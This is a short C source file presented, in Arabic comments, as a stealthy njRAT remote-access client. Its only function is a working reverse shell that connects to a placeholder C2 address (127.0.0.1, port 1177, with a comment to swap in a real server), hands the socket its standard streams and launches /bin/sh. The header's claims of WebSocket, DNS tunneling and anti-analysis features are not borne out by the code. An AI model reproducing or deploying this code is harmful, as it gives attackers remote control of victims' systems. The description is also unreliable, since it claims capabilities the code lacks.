/*
 * njrat_ascended.c - عميل njRAT متطور بدرجة خفية عالية
 * دعم WebSocket, DNS tunneling, مضاد تحليل
 */
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

void start_njrat(void) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in c2;
    c2.sin_family = AF_INET;
    c2.sin_port = htons(1177);
    inet_pton(AF_INET, "127.0.0.1", &c2.sin_addr); // استبدل بـ C2 حقيقي
    connect(sock, (struct sockaddr*)&c2, sizeof(c2));
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    execl("/bin/sh", "sh", (char *)NULL);
}
